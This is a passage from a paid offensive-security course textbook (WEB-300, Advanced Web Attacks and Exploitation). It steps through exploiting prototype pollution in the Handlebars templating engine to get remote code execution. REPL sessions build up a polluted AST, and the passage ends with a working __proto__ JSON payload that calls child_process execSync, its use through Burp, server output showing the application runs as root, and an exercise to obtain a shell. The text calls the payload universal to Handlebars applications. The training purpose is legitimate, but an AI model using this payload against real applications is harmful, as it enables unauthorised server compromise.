26    for (var i = 0, l = body.length; i < l; i++) { 
27      var current = body[i], 
28          strip = this.accept(current); 
... 
70    } 
Listing 649 - Code at First Exception 
The application threw an exception because the function expected an AST with a body but the 
function received a string instead. When the application attempted to access the length property, 
an error was thrown. We can disconnect the debugger to continue the application, set the body to 
an empty array in the prototype, and try again. 
If we do not disconnect the debugger, we will receive exceptions as we type in 
the CLI. For this reason, it’s best to disconnect and reconnect instead of clicking 
through the exceptions. 
> {}.__proto__.body = [] 
 
> Handlebars.parse("hello {{ foo }}") 
'hello {{ foo }}' 
 
> Handlebars.precompile("hello {{ foo }}") 
'{"compiler":[8,">= 4.3.0"],"main":function(container,depth0,helpers,partials,data) 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
554 
{\n' + 
  '    return "";\n' + 
  '},"useData":true}' 
Listing 650 - Empty Body Array 
With an empty array as the body, no exception is thrown and the string is returned as-is. Also, 
when we attempt to precompile it, a fairly empty function is provided. While this is progress, it’s 
not particularly helpful. Let’s generate a simple template with only a MustacheStatement and 
review what the value of the body variable is. 
> delete {}.__proto__.type 
true 
 
> delete {}.__proto__.body 
true 
 
> ast = Handlebars.parse("{{ foo }}") 
... 
> ast.body 
[ 
  { 
    type: 'MustacheStatement', 
    path: { 
      type: 'PathExpression', 
      data: false, 
      depth: 0, 
      parts: [Array], 
      original: 'foo', 
      loc: [SourceLocation] 
    }, 
    params: [], 
    hash: undefined, 
    escaped: true, 
    strip: { open: false, close: false }, 
    loc: SourceLocation { 
      source: undefined, 
      start: [Object], 
      end: [Object] 
    } 
  } 
] 
>  
Listing 651 - AST from Simple Template 
It’s very possible that we may need all the values from this object; however, it’s best to start with a 
simple example and proceed from there. We’ll first add an object to our body with a type variable 
set to “MustacheStatement”. Then, we’ll set the object prototype and start the debugger. Once 
connected, we’ll run parse and precompile. 
> {}.__proto__.type = "Program" 
'Program' 
 
> {}.__proto__.body = [{type: 'MustacheStatement'}] 
[ { type: 'MustacheStatement' } ] 
> Debugger attached. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
555 
 
> Handlebars.parse("hello {{ foo }}") 
'hello {{ foo }}' 
 
> Handlebars.precompile("hello {{ foo }}") 
Uncaught TypeError: Cannot read property 'parts' of undefined 
... 
Listing 652 - precompile Exception Thrown 
As shown in Listing 652, parsing did not throw an error, but precompiling did. Our debugger 
caught the exception and we find that it is thrown on line 552 of compiler/compiler.js. 
551  function transformLiteralToPath(sexpr) { 
552    if (!sexpr.path.parts) { 
553      var literal = sexpr.path; 
554      // Casting to string here to make false and 0 literal values play nicely with 
the rest 
555      // of the system. 
556      sexpr.path = { 
557        type: 'PathExpression', 
558        data: false, 
559        depth: 0, 
560        parts: [literal.original + ''], 
561        original: literal.original + '', 
562        loc: literal.loc 
563      }; 
564    } 
565  } 
Listing 653 - transformLiteralToPath Function 
The exception we received read: “Cannot read property ‘parts’ of undefined”. This is occurring 
because the body.path variable is undefined and JavaScript cannot access the parts variable of 
an undefined variable. To fix this, we don’t need to recreate the entire body.path object, we just 
need to set body.path to something. We’ll set it to “0” in the object prototype. But first, we need to 
disconnect the debugger. 
> {}.__proto__.body = [{type: 'MustacheStatement', path:0}] 
[ { type: 'MustacheStatement', path: 0 } ] 
 
> Handlebars.precompile("hello {{ foo }}") 
'{"compiler":[8,">= 4.3.0"],"main":function(container,depth0,helpers,partials,data) 
{\n' + 
  '    var stack1, helper, lookupProperty = container.lookupProperty || 
function(parent, propertyName) {\n' + 
  '        if (Object.prototype.hasOwnProperty.call(parent, propertyName)) {\n' + 
  '          return parent[propertyName];\n' + 
  '        }\n' + 
  '        return undefined\n' + 
  '    };\n' + 
  '\n' + 
  '  return ((stack1 = ((helper = (helper = lookupProperty(helpers,"undefined") || 
(depth0 != null ? lookupProperty(depth0,"undefined") : depth0)) != null ? helper : 
container.hooks.helperMissing),(typeof helper === "function" ? helper.call(depth0 != 
null ? depth0 : (container.nullContext || 
{}),{"name":"undefined","hash":{},"data":data,"loc":}) : helper))) != null ? stack1 : 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
556 
"");\n' +                                   
  '},"useData":true}' 
Listing 654 - Adding path to body Object in Object prototype 
When the path variable is set to “0” and a template is precompiled, a string of the function is 
returned. At first glance, it seems like we’ve discovered the minimum payload that results in a 
compiled template. However, if we review the output closely, the loc variable is not properly set. If 
we were to execute this function, we would receive a syntax error. 
The loc variable was also found in the body of the legitimate AST that we generated earlier. 
> delete {}.__proto__.type 
true 
 
> delete {}.__proto__.body 
true 
 
> ast = Handlebars.parse("{{ foo }}") 
... 
> ast.body 
[ 
  { 
    type: 'MustacheStatement', 
... 
    loc: SourceLocation { 
      source: undefined, 
      start: [Object], 
      end: [Object] 
    } 
  } 
] 
>  
Listing 655 - AST from Simple Template - loc 
Again, we’ll start with the minimum variables set and add additional ones as needed. We’ll set the 
loc variable to 0 and adjust accordingly if needed. 
> {}.__proto__.type = "Program" 
'Program' 
 
> {}.__proto__.body = [{type: 'MustacheStatement', path:0, loc: 0}] 
[ { type: 'MustacheStatement', path: 0, loc: 0 } ] 
 
> precompiled = Handlebars.precompile("hello {{ foo }}") 
'{"compiler":[8,">= 4.3.0"],"main":function(container,depth0,helpers,partials,data) 
{\n' + 
  '    var stack1, helper, lookupProperty = container.lookupProperty || 
function(parent, propertyName) {\n' + 
  '        if (Object.prototype.hasOwnProperty.call(parent, propertyName)) {\n' + 
  '          return parent[propertyName];\n' + 
  '        }\n' + 
  '        return undefined\n' + 
  '    };\n' + 
  '\n' + 
  '  return ((stack1 = ((helper = (helper = lookupProperty(helpers,"undefined") || 
(depth0 != null ? lookupProperty(depth0,"undefined") : depth0)) != null ? helper : 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
557 
container.hooks.helperMissing),(typeof helper === "function" ? helper.call(depth0 != 
null ? depth0 : (container.nullContext || 
{}),{"name":"undefined","hash":{},"data":data,"loc":0}) : helper))) != null ? stack1 : 
"");\n' +                                  
  '},"useData":true}' 
   
> eval("compiled = " + precompiled) 
{ compiler: [ 8, '>= 4.3.0' ], main: [Function: main], useData: true } 
 
> tem = Handlebars.template(compiled) 
[Function: ret] { 
  isTop: true, 
  _setup: [Function (anonymous)], 
  _child: [Function (anonymous)] 
} 
> tem() 
'' 
Listing 656 - loc Set in Object Prototype 
At this point, our template compiled, imported, and executed without throwing any errors. We 
should not expect any output since we have not added anything of substance to the 
MustacheStatement. Next, let’s add the NumberLiteral parameter to this statement. We’ll review 
the object of the example NumberLiteral we generated earlier and use this as a baseline for our 
variables. 
{ 
  type: 'NumberLiteral', 
  value: 12345, 
  original: 12345, 
  loc: SourceLocation { 
    source: undefined, 
    start: { line: 1, column: 27 }, 
    end: { line: 1, column: 32 } 
  } 
} 
Listing 657 - StringLiteral Object Example 
Again, we will start with the minimum and add additional values as necessary. We know we will 
need the type to instruct the parser to treat the value as a NumberLiteral and we need the value to 
inject into the compiled code. All of this will be placed into an array of objects in the params 
variable. 
[ 
    { 
        type: 'MustacheStatement',  
        path:0,  
        loc: 0,  
        params: [  
            {  
                type: 'NumberLiteral',  
                value: "console.log('haxhaxhax')"  
            }  
        ] 
    } 
] 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
558 
Listing 658 - Value to be Set in body 
Listing 658 shows the value that we will be using to set in the body variable within the Object 
prototype. 
> {}.__proto__.body = [{type: 'MustacheStatement', path:0, loc: 0, params: [ { type: 
'NumberLiteral', value: "console.log('haxhaxhax')" } ]}] 
[ 
  { type: 'MustacheStatement', path: 0, loc: 0, params: [ [Object] ] } 
] 
 
> precompiled = Handlebars.precompile("hello {{ foo }}") 
'{"compiler":[8,">= 4.3.0"],"main":function(container,depth0,helpers,partials,data) 
{\n' + 
  '    var stack1, lookupProperty = container.lookupProperty || function(parent, 
propertyName) {\n' + 
  '        if (Object.prototype.hasOwnProperty.call(parent, propertyName)) {\n' + 
  '          return parent[propertyName];\n' + 
  '        }\n' + 
  '        return undefined\n' + 
  '    };\n' + 
  '\n' + 
  `  return ((stack1 = (lookupProperty(helpers,"undefined")||(depth0 && 
lookupProperty(depth0,"undefined"))||container.hooks.helperMissing).call(depth0 != 
null ? depth0 : (container.nullContext || 
{}),console.log('haxhaxhax'),{"name":"undefined","hash":{},"data":data,"loc":0})) != 
null ? stack1 : "");\n` +                                                                           
  '},"useData":true}' 
Listing 659 - Adding params to body in Object Prototype 
At this point, the value is added to the compiled function. Now, let’s try to execute the function 
and verify that our payload is being executed. 
> eval("compiled = " + precompiled) 
{ compiler: [ 8, '>= 4.3.0' ], main: [Function: main], useData: true } 
 
> tem = Handlebars.template(compiled) 
[Function: ret] { 
  isTop: true, 
  _setup: [Function (anonymous)], 
  _child: [Function (anonymous)] 
} 
 
> tem() 
haxhaxhax 
Uncaught Error: Missing helper: "undefined" 
    at Object.<anonymous> 
(/usr/src/app/node_modules/handlebars/dist/cjs/handlebars/helpers/helper-
missing.js:19:13) 
    at Object.wrapper 
(/usr/src/app/node_modules/handlebars/dist/cjs/handlebars/internal/wrapHelper.js:15:19
) 
    at Object.main (eval at <anonymous> (REPL183:1:1), <anonymous>:9:138) 
    at main 
(/usr/src/app/node_modules/handlebars/dist/cjs/handlebars/runtime.js:208:32) 
    at ret 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
559 
(/usr/src/app/node_modules/handlebars/dist/cjs/handlebars/runtime.js:212:12) { 
  description: undefined, 
  fileName: undefined, 
  lineNumber: undefined, 
  endLineNumber: undefined, 
  number: undefined 
} 
Listing 660 - Rending Template with inject prototype pollution 
Although we received an error, our console.log statement executed! Excellent! 
Next, we need to apply the principles learned here to exploit the target application with an HTTP 
request. We’ll modify the request payload to include the information we added to the prototype on 
the CLI. 
"__proto__":  
{ 
  "type": "Program", 
  "body":[ 
    { 
      "type": "MustacheStatement", 
      "path":0, 
      "loc": 0, 
      "params":[ 
        { 
          "type": "NumberLiteral", 
          "value": 
"console.log(process.mainModule.require('child_process').execSync('whoami').toString()
)"  
        }  
      ] 
    } 
  ] 
} 
Listing 661 - RCE __proto__ payload 
We’ll use an exploit payload that will print out the current user running the application. We’ll use 
this payload in Burp. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
560 
 
Figure 340: Handlebars RCE exploit via Prototype Pollution 
When we send the request, we’ll use the token in the response to create a connection. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
561 
 
Figure 341: Sending token from response 
As before, the prototype is polluted towards the end of the request. To trigger it, we need to load a 
new page. 
Sending a GET request to the root generates an error. However, the docker-compose console 
includes the user that is running the application in the container (root). 
chips_1     | root 
chips_1     |  
chips_1     | root 
chips_1     |  
chips_1     | GET / 500 39.494 ms - 1152 
chips_1     | Error: /usr/src/app/views/hbs/error.hbs: Missing helper: "undefined" 
... 
Listing 662 - Console of Application Displaying User 
Excellent! We have polluted the prototype to gain RCE on the application! This payload should be 
universal in other applications that use the Handlebars library. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
562 
13.5.2.1 Exercises 
1. 
Follow along with this section but connect to the remote debugger and observe the 
prototype pollution exploit. 
2. 
Obtain a shell using this exploit. 
3. 
In this module we used the NumberLiteral type to reach RCE. Are there other types that 
might also result in RCE? What are they? 
13.5.2.2 Extra Mile 
Switch the Templating Engine to Pug and discover a path to RCE. 
13.6 Wrapping Up 
In this module, we introduced JavaScript prototypes, discussed how to pollute them, and how 
prototype pollution can be exploited. We discovered a prototype pollution vulnerability in a third-
party library and exploited it. Finally, we used the prototype pollution vulnerability to exploit two 
different templating engines. We obtained confirmation of which templating engine the remote 
server was running and obtained remote code execution from both templating engines. 
Prototype pollution is a vulnerability that is fairly common in third-party libraries. While many of 
these vulnerabilities have been fixed, many applications and libraries have not been updated to 
use the latest version. This leaves us with a prime opportunity to exploit the vulnerability and 
obtain code execution. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
563 
13.6.1.1.1 
 
14 Conclusion 
The need to secure web applications will continue to grow as long as innovation is a driving factor 
for businesses. As we rely more heavily on web applications for personal and commercial needs, 
the attack surface also continues to grow. In this course, we’ve abused these expanding attack 
surfaces to discover vulnerabilities in web applications. We leveraged these vulnerabilities to 
chain exploits resulting in the compromise of the underlying servers. 
In some instances, we used an application’s source code to identify vulnerabilities that automated 
scanners might miss. When the source code was unavailable, we applied our knowledge of web 
service architectures and programming languages to discover effective and disastrous exploits. 
Along the way, we gained a deeper understanding of how web applications work. 
14.1 The Journey So Far 
Throughout the course we explored several ways to bypass authentication in web applications, 
including session riding via cross-site scripting, type juggling, blind SQL injection, and weak 
random number generation. We gained remote code execution through insecure file uploads, 
code injection, deserialization, and server-side template injection. We chained these exploits 
together to go from unauthenticated users to remote shells on the underlying servers. 
We encourage you to continue researching web application exploits and how they can change 
depending on an application’s technology stack. A given vulnerability type, such as XML external 
entity injection, can have vastly different ramifications depending on the underlying application’s 
programming language or framework. 
14.2 Exercises and Extra Miles 
Each module of the course contains exercises designed to test your comprehension of the 
material. You will also find “Extra Miles” that require additional effort beyond the normal exercises. 
While optional, we encourage all students to attempt the “Extra Miles” to get the most out of the 
course. 
14.3 The Road Goes Ever On 
Once you’ve completed the course modules, there are three additional lab machines available for 
you to analyze and exploit: Answers, DocEdit, and Sqeakr. These machines run custom web 
applications, each of which contain several exploits based on the topics covered in this course. 
For this reason, we recommend you first complete the exercises and extra miles in the course 
modules before attempting these machines. 
We have pre-configured the Answers and DocEdit applications to enable remote debugging and 
provided the relevant source code on a debugger virtual machine. A small web application is 
running on this machine as well, accessible on localhost:80. This application simulates remote 
user actions on the two lab machines on-demand for any exploit that requires client side 
exploitation. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
564 
Choosing how to approach the Answers machine is up to you. While you may be able to find 
some vulnerabilities through a black box test, a white box approach could be more 
comprehensive. For DocEdit, we recommend you take a white box approach. 
If you want to conduct a white box test on either of these applications, you’ll find the machine 
credentials and the debugger in your control panel. 
The third machine, Sqeakr, is a black box test without any credentials or application source code 
provided. Of course, if you are able to get a shell on this machine, you can reverse engineer the 
application to look for other vulnerabilities. 
14.4 Wrapping Up 
The methodologies suggested in this course are only suggestions. We encourage you to take 
what works for you and continue developing your own methodology for web application security 
testing as you progress through the extra miles, lab machines, and onward to whatever security 
assessments await. 
It is easy to fixate on one potential vulnerability or go down rabbit holes of endless details when 
assessing web applications. If you get stuck, take a step back, challenge your assumptions, and 
change your perspective. Remember to look at all the pieces of information available to you and 
see how you can fit things together to reach your goal. Do not give up, and always remember to 
Try Harder. 
OS-555704 RAYMOND ALLEN SORENG
